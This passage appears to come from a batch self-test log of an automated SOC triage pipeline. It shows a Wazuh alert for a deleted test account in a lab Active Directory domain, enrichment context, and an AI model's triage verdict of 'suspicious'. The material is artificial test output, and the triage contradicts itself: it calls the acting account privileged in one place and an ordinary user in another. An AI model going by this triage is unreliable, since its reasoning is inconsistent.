ID:\\t\\tS-1-5-21-4206617935-2580949811-1114734249-1122\\r\\n\\tAccount Name:\\t\\tsoc-test-roaster\\r\\n\\tAccount Domain:\\t\\tESSOS\\r\\n\\r\\nAdditional Information:\\r\\n\\tPrivileges\\t-\\\"\", \"version\": \"0\", \"eventID\": \"4726\", \"providerGuid\": \"{54849625-5478-4994-A5BA-3E3B0328C30D}\"}, \"eventdata\": {\"targetDomainName\": \"ESSOS\", \"targetSid\": \"S-1-5-21-4206617935-2580949811-1114734249-1122\", \"subjectUserSid\": \"S-1-5-21-4206617935-2580949811-1114734249-1000\", \"subjectUserName\": \"vagrant\", \"subjectDomainName\": \"ESSOS\", \"subjectLogonId\": \"0x137da7d3\", \"targetUserName\": \"soc-test-roaster\"}}}, \"agent\": {\"version\": \"7.17.22\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"id\": \"002\", \"name\": \"meereen\", \"ip\": \"x.x.x.12\", \"type\": \"filebeat\"}, \"log_type\": \"hids_alert\", \"log\": {\"offset\": 65153722, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"timestamp\": \"2026-07-16T06:20:16.751+0000\", \"decoder\": {\"name\": \"windows_eventchannel\"}, \"host\": {\"name\": \"f8e24743dcc1\"}}",
+  "arrival_ms": 1784182817035,
+  "technique_ids": [
+    "T1098",
+    "T1531"
+  ],
+  "source": "wazuh",
+  "rule_id": "60111",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "2abe65b1d54dbc8522fc450a08c1aca87fd880bfbe1b94022676bb9afe6dfa12",
+  "rule_description": "User account disabled or deleted",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.16:fCWVaZ8B3gPM8FAeRMX3",
+  "time": "2026-07-16T06:20:16.751+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "ingest_time": 1784182827006,
+    "event_code": "4726",
+    "sensor": "Security",
+    "raw_ref": "soc-hids-alert-2026.07.16:fCWVaZ8B3gPM8FAeRMX3",
+    "source": "winlogbeat",
+    "event_time": "2026-07-16T06:20:16.553278400Z",
+    "event_uid": "3a3a5d96429952942c045cdf2e168a29426c36eb1db58e8a7ee73b765d56048f"
+  },
+  "subject": null,
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "meereen.essos.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:06.422Z",
+        "has_adcs": true,
+        "last_seen": "2026-07-22T03:46:17.974Z",
+        "domain": "essos.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    }
+  ]
+}
+
+### ③ 研判   [skill] generic_identity   [模式] recipe
+# 研判留痕(2 步)
+[1] recipe取证「触发事件与主语/主机」→ 1 行
+[2] recipe取证「宾语与次要参与者」→ 1 行
+
+# 研判结果  alert=2abe65b1d54dbc8522fc450a08c1aca87fd880bfbe1b94022676bb9afe6dfa12  path=B  skill=generic_identity
+verdict   : suspicious  [倾向 malicious]  (confidence=0.65)
+summary   : 域内特权账号(vagrant)删除了测试账号(soc-test-roaster)。虽账号名含'test'，但删除行为本身符合 T1098/T1531攻击模式，且缺乏明确的业务审批或自动化运维上下文，需确认为误报或攻击。
+rationale : 1. 事件为 EventID 4726 (User account deleted)，主体为 ESSOS 域的 vagrant (SID 1000，通常为普通用户或测试账号)，目标为 soc-test-roaster。2. 告警关联 T1098 (Account Manipulation) 和 T1531 (Account Access Removal)，表明攻击者可能试图通过删除账号来清除痕迹或破坏服务。3. 虽然目标账号名包含'soc-test'，暗示可能是测试环境，但在 SOC 研判中，账号删除属于高敏感操作，不能仅凭名称判定为良性。4. 证据中未提供该账号的组隶属关系(是否特权)、删除操作的时间规律(是否批量)、以及是否有后续关联的提权或横向移动行为。5. 根据通用研判方法论，在无法确证为自动化运维或已知良性基线时，此类账号删除行为应视为可疑，倾向于恶意，需进一步调查。
+evidence  : ['2abe65b1d54dbc8522fc450a08c1aca87fd880bfbe1b94022676bb9afe6dfa12', '3a3a5d96429952942c045cdf2e168a29426c36eb1db58e8a7ee73b765d56048f']
+missing   : ['目标账号 soc-test-roaster 的组隶属关系(是否属于特权组或关键业务组)', '主体账号 vagrant 的组隶属关系及历史行为基线', '该删除操作是否由自动化运维脚本触发(如 Ansible/SaltStack 日志)', '删除操作前后是否有其他异常登录或凭据窃取行为', '目标账号 soc-test-roaster 的创建时间和最后登录时间(判断是否为僵尸账号)']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+# 批量自测完成
+=== done 2026-07-22 03:52Z ===
